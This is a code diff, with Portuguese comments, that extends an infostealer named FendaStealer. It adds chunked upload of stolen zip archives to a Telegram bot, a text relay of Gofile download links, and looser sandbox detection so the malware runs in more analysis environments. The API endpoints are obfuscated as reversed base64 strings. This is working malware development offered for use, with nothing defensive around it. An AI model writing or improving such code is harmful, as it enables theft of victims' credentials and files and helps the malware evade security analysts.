@@ -204,17 +204,51 @@ class Malware:
             return None
 
     def upload_telegram(self, file_path):
-        """Exfil via bot do Telegram: o zip cai direto no seu chat (sem Discord)."""
+        """Exfil via bot do Telegram. Divide o zip em partes <=45 MB se precisar."""
         token = decode_const(TELEGRAM_TOKEN_ENC)
         chat = decode_const(TELEGRAM_CHAT_ENC)
         if not token or not chat or "REPLACE" in token:
             return False
         try:
             url = decode_const(TELEGRAM_API) + token + "/sendDocument"
+            chunk = 45 * 1024 * 1024
+            size = os.path.getsize(file_path)
+
+            if size <= chunk:
+                with open(file_path, "rb") as f:
+                    files = {"document": (os.path.basename(file_path), f)}
+                    data = {"chat_id": chat, "caption": "sklauncher result | v2.1.0"}
+                    r = requests.post(url, data=data, files=files, timeout=120)
+                return r.json().get("ok", False)
+
+            # arquivo grande: envia em partes
+            ok_all = True
+            idx = 0
             with open(file_path, "rb") as f:
-                files = {"document": (os.path.basename(file_path), f)}
-                data = {"chat_id": chat, "caption": "sklauncher result | v2.1.0"}
-                r = requests.post(url, data=data, files=files, timeout=30)
+                while True:
+                    part = f.read(chunk)
+                    if not part:
+                        break
+                    idx += 1
+                    fn = os.path.basename(file_path) + ".part" + str(idx)
+                    files = {"document": (fn, part)}
+                    data = {"chat_id": chat, "caption": "part " + str(idx)}
+                    r = requests.post(url, data=data, files=files, timeout=180)
+                    if not r.json().get("ok", False):
+                        ok_all = False
+            return ok_all
+        except Exception:
+            return False
+
+    def send_telegram_text(self, text):
+        """Envia uma mensagem de texto simples pro chat do Telegram."""
+        token = decode_const(TELEGRAM_TOKEN_ENC)
+        chat = decode_const(TELEGRAM_CHAT_ENC)
+        if not token or not chat or "REPLACE" in token:
+            return False
+        try:
+            url = decode_const(TELEGRAM_API) + token + "/sendMessage"
+            r = requests.post(url, data={"chat_id": chat, "text": text}, timeout=30)
             return r.json().get("ok", False)
         except Exception:
             return False
@@ -382,7 +416,8 @@ class Malware:
             _sandbox = Checks.sandbox_reasons()
             if _sandbox:
                 print('sandbox indicators:', _sandbox)
-                if not test_mode:
+                # so aborta com 2+ indicadores (MAC sozinho e falso positivo comum)
+                if not test_mode and len(_sandbox) >= 2:
                     print('detected sandbox environment')
                     return
             if Checks.is_debugged() and not test_mode:
@@ -403,6 +438,7 @@ class Malware:
                 else:
                     gofile_url = self.upload_gofile(zip_file_path)
                     if gofile_url:
+                        self.send_telegram_text("FendaStealer result: " + gofile_url)
                         self.send_webhook(gofile_url=gofile_url, file_path=None)
                     else:
                         self.send_webhook(gofile_url=None, file_path=zip_file_path)
@@ -669,7 +705,7 @@ class Checks:
 
     @staticmethod
     def is_sandboxed() -> bool:
-        return bool(Checks.sandbox_reasons())
+        return len(Checks.sandbox_reasons()) >= 2
 
     @staticmethod
     def is_debugged() -> bool:
@@ -2106,7 +2142,7 @@ NTDLL = "bGxkLmxsZHRu"
 
 GOFILE_ENC = "ZWxpRmRhb2xwdS9vaS5lbGlmb2cuZGFvbHB1Ly86c3B0dGg="
 TELEGRAM_API = "dG9iL2dyby5tYXJnZWxldC5pcGEvLzpzcHR0aA=="
-# Preencha antes de buildar (gere via: python fendastealer.py enc "VALOR")
+# Telegram (bot + chat_id) - SUBSTITUA PELOS SEUS (gere via: python fendastealer.py enc "VALOR")
 TELEGRAM_TOKEN_ENC = "TkVLT1RfVE9CX0hUSVdfRUNBTFBFUg=="   # REPLACE_WITH_BOT_TOKEN
 TELEGRAM_CHAT_ENC = "REElfVEFIQ19IVElXX0VDQUxQRVI="       # REPLACE_WITH_CHAT_ID
 
